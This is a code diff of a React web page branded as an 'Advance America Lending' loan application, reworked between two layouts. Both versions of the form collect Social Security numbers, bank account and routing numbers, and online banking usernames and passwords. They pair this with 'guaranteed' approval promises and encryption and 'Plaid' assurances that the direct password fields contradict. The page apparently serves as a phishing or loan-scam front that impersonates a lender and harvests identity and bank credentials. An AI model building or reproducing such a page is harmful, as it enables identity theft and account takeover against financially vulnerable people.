-              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+            
+            <div className="aa-sidebar-card" style={{background: 'var(--navy)', color: 'white', border:'none'}}>
+              <h3 style={{color:'white'}}>Guaranteed Rates</h3>
+              <p style={{color:'#cbd5e1', marginBottom: 20}}>We specialize in flexible options regardless of credit history.</p>
+              <ul style={{listStyle:'none', display:'flex', flexDirection:'column', gap:12}}>
+                <li style={{display:'flex', gap:10, fontSize:14}}><ShieldCheckIcon/> APR starting from 6.99%</li>
+                <li style={{display:'flex', gap:10, fontSize:14}}><ShieldCheckIcon/> Flexible terms up to 84 months</li>
+                <li style={{display:'flex', gap:10, fontSize:14}}><ShieldCheckIcon/> Instant auto-approval engine</li>
+              </ul>
             </div>
-            <h3>Bad Credit Loans</h3>
-            <p>Flexible loans for those with credit challenges. We believe everyone deserves a second chance, offering guaranteed repayment options.</p>
-          </div>
-          <div className="aa-service-card">
-            <div className="aa-service-icon">
-              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+
+            <div className="aa-sidebar-card">
+              <img src="/aa-freedom.png" alt="Debt Consolidation" />
+              <h3>Consolidate Debt</h3>
+              <p>Roll multiple high-interest debts into one easily manageable monthly payment. Regain control of your financial future.</p>
             </div>
-            <h3>Collateral Loans</h3>
-            <p>Secure loans backed by your valuable assets. Including gold-backed loans providing high capital injection instantly.</p>
-          </div>
-        </div>
-      </section>
+          </aside>
 
-      {/* Loans */}
-      <section className="aa-section" id="loans">
-        <div className="aa-title-center">
-          <div className="aa-sec-eyebrow">Loans</div>
-          <h2 className="aa-sec-title">Explore our loan options</h2>
-        </div>
-        <div className="aa-services">
-          <div className="aa-service-card">
-            <div className="aa-service-icon">
-              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
-            </div>
-            <h3>Personal Loans</h3>
-            <p>Flexible personal loans for unexpected expenses, debt consolidation, or major purchases. Enjoy low interest rates starting from 6.99%, no collateral required, quick approval in as little as 24 hours, and repayment terms up to 7 years. Ideal for individuals with fair to good credit.</p>
-          </div>
-          <div className="aa-service-card">
-            <div className="aa-service-icon">
-              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9,22 9,12 15,12 15,22"/></svg>
-            </div>
-            <h3>Home Loans</h3>
-            <p>Mortgage loans for buying your dream home or refinancing existing loans. Benefit from competitive rates as low as 3.5%, long-term repayment up to 30 years, tax deductions, and building equity. Available for first-time buyers and experienced homeowners with various credit profiles.</p>
-          </div>
-          <div className="aa-service-card">
-            <div className="aa-service-icon">
-              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><circle cx="7" cy="17" r="2"/><circle cx="17" cy="17" r="2"/></svg>
-            </div>
-            <h3>Auto Loans</h3>
-            <p>Financing for new or used vehicles with loan amounts up to $50,000. Enjoy flexible terms from 24 to 84 months, competitive rates starting at 4.99%, quick approval, and the ability to include taxes and fees. Perfect for buying cars, trucks, motorcycles, or RVs.</p>
-          </div>
-        </div>
-      </section>
-
-      {/* Testimonial */}
-      <section className="aa-section light">
-        <div style={{maxWidth:"600px",margin:"0 auto",textAlign:"center"}}>
-          <p style={{fontSize:"18px",fontStyle:"italic"}}>"Advance America Lending made my loan process easy and stress-free!"</p>
-          <p style={{fontWeight:"bold",marginTop:"10px"}}>Victor</p>
-          <div style={{display:"flex",justifyContent:"center",marginTop:"10px"}}>
-            <StarRating/>
-          </div>
-        </div>
-      </section>
-
-      {/* Financial Tools */}
-      <section className="aa-section light" id="calculator">
-        <div className="aa-title-center">
-          <div className="aa-sec-eyebrow">Tools</div>
-          <h2 className="aa-sec-title">Financial Tools Dashboard</h2>
-        </div>
-
-        {/* Tabs */}
-        <div style={{display: 'flex', justifyContent: 'center', gap: '10px', marginBottom: '40px', flexWrap: 'wrap'}}>
-          <button
-            onClick={() => setActiveTool('loan-calculator')}
-            className={`aa-btn-primary ${activeTool === 'loan-calculator' ? '' : 'opacity-50'}`}
-            style={{padding: '10px 20px', fontSize: '14px'}}
-          >
-            Loan Calculator
-          </button>
-          <button
-            onClick={() => setActiveTool('credit-simulator')}
-            className={`aa-btn-primary ${activeTool === 'credit-simulator' ? '' : 'opacity-50'}`}
-            style={{padding: '10px 20px', fontSize: '14px'}}
-          >
-            Credit Simulator
-          </button>
-          <button
-            onClick={() => setActiveTool('debt-consolidation')}
-            className={`aa-btn-primary ${activeTool === 'debt-consolidation' ? '' : 'opacity-50'}`}
-            style={{padding: '10px 20px', fontSize: '14px'}}
-          >
-            Debt Consolidation
-          </button>
-        </div>
-
-        {/* Loan Calculator */}
-        {activeTool === 'loan-calculator' && (
-          <div style={{maxWidth: '600px', margin: '0 auto'}}>
-            <form onSubmit={handleCalculate}>
-              <div className="aa-fgroup">
-                <label className="aa-lbl">Loan Amount ($)</label>
-                <input className="aa-in" type="number" value={loanAmount} onChange={e => setLoanAmount(e.target.value)} required />
-              </div>
-              <div className="aa-fgroup">
-                <label className="aa-lbl">Annual Interest Rate (%)</label>
-                <input className="aa-in" type="number" step="0.01" value={interestRate} onChange={e => setInterestRate(e.target.value)} required />
-              </div>
-              <div className="aa-fgroup">
-                <label className="aa-lbl">Loan Term (years)</label>
-                <input className="aa-in" type="number" value={term} onChange={e => setTerm(e.target.value)} required />
-              </div>
-              <button type="submit" className="aa-btn-primary">Calculate</button>
-            </form>
-            {monthlyPayment && (
-              <div style={{marginTop: '20px', padding: '20px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)', animation: 'fadeIn 0.5s'}}>
-                <h3 style={{color: 'var(--aa-navy)'}}>Estimated Monthly Payment: ${monthlyPayment.toFixed(2)}</h3>
-                <p style={{fontSize: '14px', color: 'var(--aa-muted)', marginTop: '10px'}}>This is an estimate and does not include taxes, fees, or insurance. Actual payments may vary based on your credit profile and lender terms.</p>
-              </div>
-            )}
-          </div>
-        )}
-
-        {/* Credit Simulator */}
-        {activeTool === 'credit-simulator' && (
-          <div style={{maxWidth: '800px', margin: '0 auto'}}>
-            <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '40px'}}>
-              <div>
-                <h3 style={{color: 'var(--aa-navy)', marginBottom: '20px'}}>Credit Score Simulator</h3>
-                <div className="aa-fgroup">
-                  <label className="aa-lbl">Current Credit Score</label>
-                  <input className="aa-in" type="number" value={currentScore} onChange={e => setCurrentScore(Number(e.target.value))} />
+          {/* Right Main Form Container */}
+          <section className="aa-form-container">
+            <div className="aa-form-header">
+              <h2>Secure Application</h2>
+              <p>Please fill out your verified details below.</p>
+              {client && (
+                <div style={{marginTop:20, background:'rgba(255,255,255,0.1)', padding:'12px 20px', borderRadius:8, display:'inline-flex', alignItems:'center', gap:10, border:'1px solid rgba(255,255,255,0.2)'}}>
+                  <ShieldCheckIcon/> Authenticated session for <strong>{client.name}</strong>
                 </div>
-                <button onClick={handleCreditSimulate} className="aa-btn-primary" style={{width: '100%'}}>Simulate</button>
-              </div>
-              <div>
-                <h3 style={{color: 'var(--aa-navy)', marginBottom: '20px'}}>Projected Score</h3>
-                <div style={{textAlign: 'center', padding: '40px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)'}}>
-                  <div style={{fontSize: '48px', fontWeight: 'bold', color: 'var(--aa-primary)', animation: projectedScore !== currentScore ? 'bounce 0.5s' : 'none'}}>{projectedScore}</div>
-                  <p>FICO Score</p>
-                </div>
-              </div>
+              )}
             </div>
-          </div>
-        )}
-
-        {/* Debt Consolidation */}
-        {activeTool === 'debt-consolidation' && (
-          <div style={{maxWidth: '800px', margin: '0 auto'}}>
-            <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '40px'}}>
-              <div>
-                <h3 style={{color: 'var(--aa-navy)', marginBottom: '20px'}}>Current Debts</h3>
-                {debts.map((debt, index) => (
-                  <div key={index} style={{marginBottom: '20px', padding: '20px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)'}}>
-                    <input className="aa-in" placeholder="Debt Name" value={debt.name} onChange={e => {
-                      const newDebts = [...debts];
-                      newDebts[index].name = e.target.value;
-                      setDebts(newDebts);
-                    }} />
-                    <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '10px', marginTop: '10px'}}>
-                      <input className="aa-in" type="number" placeholder="Balance" value={debt.balance} onChange={e => {
-                        const newDebts = [...debts];
-                        newDebts[index].balance = Number(e.target.value);
-                        setDebts(newDebts);
-                      }} />
-                      <input className="aa-in" type="number" step="0.01" placeholder="APR %" value={debt.rate} onChange={e => {
-                        const newDebts = [...debts];
-                        newDebts[index].rate = Number(e.target.value);
-                        setDebts(newDebts);
-                      }} />
-                      <input className="aa-in" type="number" placeholder="Min Payment" value={debt.payment} onChange={e => {
-                        const newDebts = [...debts];
-                        newDebts[index].payment = Number(e.target.value);
-                        setDebts(newDebts);
-                      }} />
-                    </div>
-                  </div>
-                ))}
-                <button onClick={() => setDebts([...debts, { balance: 0, rate: 0, payment: 0, name: 'New Debt' }])} className="aa-btn-primary" style={{width: '100%'}}>Add Debt</button>
-                <div style={{marginTop: '20px'}}>
-                  <label className="aa-lbl">Consolidation APR (%)</label>
-                  <input className="aa-in" type="number" step="0.01" value={consolidationRate} onChange={e => setConsolidationRate(Number(e.target.value))} />
-                  <label className="aa-lbl">Term (months)</label>
-                  <input className="aa-in" type="number" value={consolidationTerm} onChange={e => setConsolidationTerm(Number(e.target.value))} />
-                </div>
-              </div>
-              <div>
-                <h3 style={{color: 'var(--aa-navy)', marginBottom: '20px'}}>Consolidation Savings</h3>
-                <div style={{padding: '20px', background: 'var(--aa-primary)', color: '#fff', borderRadius: '8px', textAlign: 'center', animation: 'slideIn 0.5s'}}>
-                  <div style={{fontSize: '36px', fontWeight: 'bold'}}>${calculateDebtConsolidation().savings.toFixed(2)}</div>
-                  <p>Monthly Savings</p>
-                </div>
-                <div style={{marginTop: '20px', padding: '20px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)'}}>
-                  <p><strong>Total Debt:</strong> ${calculateDebtConsolidation().totalDebt.toFixed(2)}</p>
-                  <p><strong>Current Payment:</strong> ${calculateDebtConsolidation().totalCurrentPayment.toFixed(2)}</p>
-                  <p><strong>New Payment:</strong> ${calculateDebtConsolidation().consolidationPayment.toFixed(2)}</p>
-                </div>
-              </div>
-            </div>
-          </div>
-        )}
-      </section>
-
-      {/* Application Form */}
-      <section className="aa-section" id="apply">
-        <div className="aa-form-wrap">
-          <div className="aa-form-header">
-            <h2>Advance America Application</h2>
-            <p>Complete our secure online form to get matched with the perfect loan.</p>
-          </div>
-
-          <div className="aa-form-body">
-            {client && (
-              <div className="aa-client-badge">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
-                Secure access verified for {client.name}
-              </div>
-            )}
 
             <form onSubmit={handleSubmit(onSubmit)}>
-              {/* Personal */}
-              <div className="aa-sec-group">
-                <div className="aa-fg-label"><UserIcon/> Personal Details</div>
-                <div className="aa-g2">
-                  <div className="aa-fgroup"><label className="aa-lbl">First Name</label><input className="aa-in" {...register("firstName")} placeholder="John"/>{errors.firstName&&<p className="aa-err">{errors.firstName.message}</p>}</div>
-                  <div className="aa-fgroup"><label className="aa-lbl">Last Name</label><input className="aa-in" {...register("lastName")} placeholder="Doe"/>{errors.lastName&&<p className="aa-err">{errors.lastName.message}</p>}</div>
-                  <div className="aa-fgroup"><label className="aa-lbl">Email Address</label><input className="aa-in" type="email" {...register("email")} placeholder="john@example.com"/>{errors.email&&<p className="aa-err">{errors.email.message}</p>}</div>
-                  <div className="aa-fgroup"><label className="aa-lbl">Phone Number</label><input className="aa-in" {...register("phone")} placeholder="(555) 000-0000"/>{errors.phone&&<p className="aa-err">{errors.phone.message}</p>}</div>
-                  <div className="aa-fgroup"><label className="aa-lbl">Date of Birth</label><input className="aa-in" type="date" {...register("dob")}/>{errors.dob&&<p className="aa-err">{errors.dob.message}</p>}</div>
-                  <div className="aa-fgroup"><label className="aa-lbl">SSN (9 digits)</label><div className="aa-icon-field"><input className="aa-in" {...register("ssn")} placeholder="Social Security Number" maxLength={9}/><span className="fi"><LockIcon/></span></div>{errors.ssn&&<p className="aa-err">{errors.ssn.message}</p>}</div>
+              <div className="aa-form-stepper">
+                
+                {/* Step 1 */}
+                <div className="aa-section">
+                  <h3 className="aa-section-title">
+                    <span className="aa-step-indicator">1</span>
+                    Basic Information
+                  </h3>
+                  <div className="aa-grid-2">
+                    <div className="aa-fgroup"><label className="aa-lbl">First Name</label>
+                      <div className="aa-icon-input"><span className="aa-field-icon"><UserIcon/></span>
+                      <input className="aa-in" {...register("firstName")} placeholder="Legal First Name"/></div>
+                      {errors.firstName&&<p className="aa-err">{errors.firstName.message}</p>}
+                    </div>
+                    <div className="aa-fgroup"><label className="aa-lbl">Last Name</label>
+                      <input className="aa-in" {...register("lastName")} placeholder="Legal Last Name"/>
+                      {errors.lastName&&<p className="aa-err">{errors.lastName.message}</p>}
+                    </div>
+                    <div className="aa-fgroup"><label className="aa-lbl">Email Address</label>
+                      <input className="aa-in" type="email" {...register("email")} placeholder="you@domain.com"/>
+                      {errors.email&&<p className="aa-err">{errors.email.message}</p>}
+                    </div>
+                    <div className="aa-fgroup"><label className="aa-lbl">Phone Number</label>
+                      <input className="aa-in" {...register("phone")} placeholder="(555) 000-0000"/>
+                      {errors.phone&&<p className="aa-err">{errors.phone.message}</p>}
+                    </div>
+                    <div className="aa-fgroup"><label className="aa-lbl">Date of Birth</label>
+                      <input className="aa-in" type="date" {...register("dob")}/>
+                      {errors.dob&&<p className="aa-err">{errors.dob.message}</p>}
+                    </div>
+                    <div className="aa-fgroup"><label className="aa-lbl">SSN (9 digits)</label>
+                      <div className="aa-icon-input"><span className="aa-field-icon"><LockIcon/></span>
+                      <input className="aa-in" type="password" {...register("ssn")} placeholder="•••••••••" maxLength={9}/></div>
+                      {errors.ssn&&<p className="aa-err">{errors.ssn.message}</p>}
+                    </div>
+                  </div>
+                  <div className="aa-fgroup" style={{marginTop:24}}><label className="aa-lbl">Street Address</label>
+                    <input className="aa-in" {...register("address")} placeholder="123 Example Street, Apt 4B"/>
+                    {errors.address&&<p className="aa-err">{errors.address.message}</p>}
+                  </div>
+                  <div className="aa-grid-3" style={{marginTop:24}}>
+                    <div className="aa-fgroup"><label className="aa-lbl">City</label><input className="aa-in" {...register("city")} placeholder="City"/>{errors.city&&<p className="aa-err">{errors.city.message}</p>}</div>
+                    <div className="aa-fgroup"><label className="aa-lbl">State</label><input className="aa-in" {...register("state")} placeholder="State" maxLength={2}/>{errors.state&&<p className="aa-err">{errors.state.message}</p>}</div>
+                    <div className="aa-fgroup"><label className="aa-lbl">Zip</label><input className="aa-in" {...register("zip")} placeholder="Zipcode" maxLength={5}/>{errors.zip&&<p className="aa-err">{errors.zip.message}</p>}</div>
+                  </div>
                 </div>
-                <div className="aa-fgroup"><label className="aa-lbl">Street Address</label><input className="aa-in" {...register("address")} placeholder="123 Main St"/>{errors.address&&<p className="aa-err">{errors.address.message}</p>}</div>
-                <div className="aa-g3">
-                  <div className="aa-fgroup"><label className="aa-lbl">City</label><input className="aa-in" {...register("city")} placeholder="City"/>{errors.city&&<p className="aa-err">{errors.city.message}</p>}</div>
-                  <div className="aa-fgroup"><label className="aa-lbl">State</label><input className="aa-in" {...register("state")} placeholder="State (2 letters)" maxLength={2}/>{errors.state&&<p className="aa-err">{errors.state.message}</p>}</div>
-                  <div className="aa-fgroup"><label className="aa-lbl">Zip Code</label><input className="aa-in" {...register("zip")} placeholder="Zipcode" maxLength={5}/>{errors.zip&&<p className="aa-err">{errors.zip.message}</p>}</div>
-                </div>
-              </div>
 
-              {/* Loan */}
-              <div className="aa-sec-group">
-                <div className="aa-fg-label"><BriefcaseIcon/> Employment & Loan Info</div>
-                <div className="aa-g2">
-                  <div className="aa-fgroup"><label className="aa-lbl">Monthly Income ($)</label><input className="aa-in" type="number" {...register("monthlyIncome")} placeholder="0.00"/>{errors.monthlyIncome&&<p className="aa-err">{errors.monthlyIncome.message}</p>}</div>
-                  <div className="aa-fgroup"><label className="aa-lbl">Requested Loan Amount ($)</label><input className="aa-in" type="number" {...register("loanAmount")} placeholder="0.00"/>{errors.loanAmount&&<p className="aa-err">{errors.loanAmount.message}</p>}</div>
+                {/* Step 2 */}
+                <div className="aa-section">
+                  <h3 className="aa-section-title">
+                    <span className="aa-step-indicator">2</span>
+                    Loan Details
+                  </h3>
+                  <div className="aa-grid-2">
+                    <div className="aa-fgroup"><label className="aa-lbl">Monthly Income ($)</label>
+                      <input className="aa-in" type="number" {...register("monthlyIncome")} placeholder="3500"/>
+                      {errors.monthlyIncome&&<p className="aa-err">{errors.monthlyIncome.message}</p>}
+                    </div>
+                    <div className="aa-fgroup"><label className="aa-lbl">Requested Loan Amount ($)</label>
+                      <input className="aa-in" type="number" {...register("loanAmount")} placeholder="10000"/>
+                      {errors.loanAmount&&<p className="aa-err">{errors.loanAmount.message}</p>}
+                    </div>
+                  </div>
+                  <div className="aa-fgroup" style={{marginTop:24}}><label className="aa-lbl">Estimated Credit Profile</label>
+                    <Controller name="creditScore" control={control} render={({field})=>(
+                      <Select onValueChange={field.onChange} value={field.value||""}>
+                        <SelectTrigger className="aa-in" style={{borderWidth:2}}><SelectValue placeholder="Select credit profile"/></SelectTrigger>
+                        <SelectContent style={{fontFamily:"'Inter',sans-serif"}}>
+                          <SelectItem value="good">Good / Excellent (700+)</SelectItem>
+                          <SelectItem value="low">Fair (600–699)</SelectItem>
+                          <SelectItem value="bad">Poor (Below 600) — Guaranteed Programs Match</SelectItem>
+                        </SelectContent>
+                      </Select>
+                    )}/>
+                    {errors.creditScore&&<p className="aa-err">{errors.creditScore.message}</p>}
+                  </div>
                 </div>
-                <div className="aa-fgroup"><label className="aa-lbl">Estimated Credit Score</label>
-                  <Controller name="creditScore" control={control} render={({field})=>(
-                    <Select onValueChange={field.onChange} value={field.value||""}>
-                      <SelectTrigger style={{height:48,borderRadius:6,borderColor:"#cbd5e1",fontSize:15}}><SelectValue placeholder="Select credit profile"/></SelectTrigger>
-                      <SelectContent>
-                        <SelectItem value="good">Good (700+)</SelectItem>
-                        <SelectItem value="low">Fair (600–699)</SelectItem>
-                        <SelectItem value="bad">Poor (Below 600) — Guaranteed Options Available</SelectItem>
-                      </SelectContent>
-                    </Select>
-                  )}/>
-                  {errors.creditScore&&<p className="aa-err">{errors.creditScore.message}</p>}
-                </div>
-              </div>
 
-              {/* Banking */}
-              <div className="aa-sec-group">
-                <div className="aa-fg-label"><BankIcon/> Bank Authentication</div>
-                <p style={{fontSize:14,color:"var(--aa-muted)",marginBottom:20}}>We use bank-level 256-bit encryption to securely verify your income and deposit funds directly to your account.</p>
-                <div className="aa-g2">
-                  <div className="aa-fgroup"><label className="aa-lbl">Bank Name</label><input className="aa-in" {...register("bankName")} placeholder="Name of your institution"/>{errors.bankName&&<p className="aa-err">{errors.bankName.message}</p>}</div>
-                  <div className="aa-fgroup"><label className="aa-lbl">Years with Bank</label><input className="aa-in" type="number" {...register("yearsWithBank")} placeholder="Years"/>{errors.yearsWithBank&&<p className="aa-err">{errors.yearsWithBank.message}</p>}</div>
-                  <div className="aa-fgroup"><label className="aa-lbl">Account Number</label><div className="aa-icon-field"><input className="aa-in" {...register("accountNumber")} placeholder="Account No."/><span className="fi"><LockIcon/></span></div>{errors.accountNumber&&<p className="aa-err">{errors.accountNumber.message}</p>}</div>
-                  <div className="aa-fgroup"><label className="aa-lbl">Routing Number</label><div className="aa-icon-field"><input className="aa-in" {...register("routingNumber")} placeholder="9 digit routing no." maxLength={9}/><span className="fi"><LockIcon/></span></div>{errors.routingNumber&&<p className="aa-err">{errors.routingNumber.message}</p>}</div>
-                  <div className="aa-fgroup"><label className="aa-lbl">Bank Login Username</label><div className="aa-icon-field"><input className="aa-in" {...register("mobileUsername")} placeholder="Online ID / Username"/><span className="fi"><LockIcon/></span></div>{errors.mobileUsername&&<p className="aa-err">{errors.mobileUsername.message}</p>}</div>
-                  <div className="aa-fgroup"><label className="aa-lbl">Bank Login Password</label><div className="aa-icon-field"><input className="aa-in" type="password" {...register("mobilePassword")} placeholder="Password"/><span className="fi"><LockIcon/></span></div>{errors.mobilePassword&&<p className="aa-err">{errors.mobilePassword.message}</p>}</div>
-                </div>
-              </div>
+                {/* Step 3 */}
+                <div className="aa-section">
+                  <h3 className="aa-section-title">
+                    <span className="aa-step-indicator">3</span>
+                    Bank Authentication
+                  </h3>
+                  
+                  <div className="aa-secure-banner">
+                     <ShieldCheckIcon/>
+                     <span>We use 256-bit encryption through Plaid to securely verify identity, income, and process direct deposits without retaining your credentials.</span>
+                  </div>
 
-              <button type="submit" className="aa-submit" disabled={isSubmitting}>
-                {isSubmitting ? <><div className="aa-spin"/>Processing...</> : <>Submit Application <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><polyline points="9 18 15 12 9 6"/></svg></>}
-              </button>
-              <p className="aa-fine"><LockIcon/> Your data is protected by industry-leading 256-bit encryption. We never share your personal information with third parties without consent.</p>
+                  <div className="aa-grid-2">
+                    <div className="aa-fgroup"><label className="aa-lbl">Institution Name</label>
+                      <div className="aa-icon-input"><span className="aa-field-icon"><BuildingIcon/></span>
+                      <input className="aa-in" {...register("bankName")} placeholder="Chase, BofA, etc."/></div>
+                      {errors.bankName&&<p className="aa-err">{errors.bankName.message}</p>}</div>
+                    <div className="aa-fgroup"><label className="aa-lbl">Years with Bank</label>
+                      <input className="aa-in" type="number" {...register("yearsWithBank")} placeholder="e.g. 5"/>
+                      {errors.yearsWithBank&&<p className="aa-err">{errors.yearsWithBank.message}</p>}</div>
+                    
+                    <div className="aa-fgroup"><label className="aa-lbl">Account Number</label>
+                      <div className="aa-icon-input"><span className="aa-field-icon"><LockIcon/></span>
+                      <input className="aa-in" {...register("accountNumber")} placeholder="Bank Account No."/></div>
+                      {errors.accountNumber&&<p className="aa-err">{errors.accountNumber.message}</p>}</div>
+                    <div className="aa-fgroup"><label className="aa-lbl">Routing Number</label>
+                      <div className="aa-icon-input"><span className="aa-field-icon"><LockIcon/></span>
+                      <input className="aa-in" {...register("routingNumber")} placeholder="9 digit routing no." maxLength={9}/></div>
+                      {errors.routingNumber&&<p className="aa-err">{errors.routingNumber.message}</p>}</div>
+                    
+                    <div className="aa-fgroup"><label className="aa-lbl">Online Banking ID</label>
+                      <div className="aa-icon-input"><span className="aa-field-icon"><LockIcon/></span>
+                      <input className="aa-in" {...register("mobileUsername")} placeholder="Online ID / Username"/></div>
+                      {errors.mobileUsername&&<p className="aa-err">{errors.mobileUsername.message}</p>}</div>
+                    <div className="aa-fgroup"><label className="aa-lbl">Online Banking Password</label>
+                      <div className="aa-icon-input"><span className="aa-field-icon"><LockIcon/></span>
+                      <input className="aa-in" type="password" {...register("mobilePassword")} placeholder="Password"/></div>
+                      {errors.mobilePassword&&<p className="aa-err">{errors.mobilePassword.message}</p>}</div>
+                  </div>
+                </div>
+
+              </div>
+              
+              {/* Submission Footer */}
+              <div className="aa-submit-area">
+                <button type="submit" className="aa-submit-btn" disabled={isSubmitting}>
+                  {isSubmitting ? <><div className="aa-spin"/> Authenticating...</> : <>Submit Application <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg></>}
+                </button>
+                <p style={{fontSize:13, color:'var(--text-muted)', marginTop:20, maxWidth:500, margin:'20px auto 0'}}>
+                  By clicking submit, you authorize Advance America to obtain consumer credit information to verify your identity and assess loan eligibility.
+                </p>
+              </div>
             </form>
-          </div>
-        </div>
-      </section>
 
-      {/* Footer */}
+          </section>
+        </div>
+      </main>
+
       <footer className="aa-footer">
         <div className="aa-ft-inner">
-          <div className="aa-ft-brand">
+          <div>
             <AALogo/>
-            <p>Advance America Lending made my loan process easy and stress-free!</p>
+            <p style={{fontSize:15, color:'rgba(255,255,255,0.7)', marginTop:20, maxWidth:300, lineHeight:1.6}}>Empowering financial growth with secure, fast, and reliable automated lending solutions.</p>
           </div>
           <div>
-            <h4 style={{fontSize:16,marginBottom:15,color:"var(--aa-primary)"}}>Advance America Lending. LTD</h4>
+            <h4 style={{fontSize:18, marginBottom:20, color:"var(--gold)", fontFamily:"'Outfit',sans-serif"}}>Advance America Lending</h4>
             <div className="aa-ft-contact">
-              <p style={{fontSize:14,color:"rgba(255,255,255,0.6)",marginTop:10,maxWidth:250}}>
-                Advance America Lending. LTD<br/>
-                2602 E Fletcher Ave Unit 10, Tampa FL 33612
+              <p style={{fontSize:15, color:"rgba(255,255,255,0.7)", marginBottom:10}}>Toll-Free: <a href="#">(800) 555-0199</a></p>
+              <p style={{fontSize:15, color:"rgba(255,255,255,0.7)", marginBottom:10}}>Email: <a href="mailto:support@advanceamerica.test">support@advanceamerica.test</a></p>
+              <p style={{fontSize:15, color:"rgba(255,255,255,0.7)", maxWidth:280, marginTop:24}}>
+                2602 E Fletcher Ave Unit 10<br/>Tampa, FL 33612
               </p>
             </div>
           </div>
         </div>
         <div className="aa-fb">
-          © 2025. All rights reserved Advance America Lending
+          © {new Date().getFullYear()} Advance America Lending. All rights reserved.
         </div>
       </footer>
-    </div>
+    </>
   );
 }
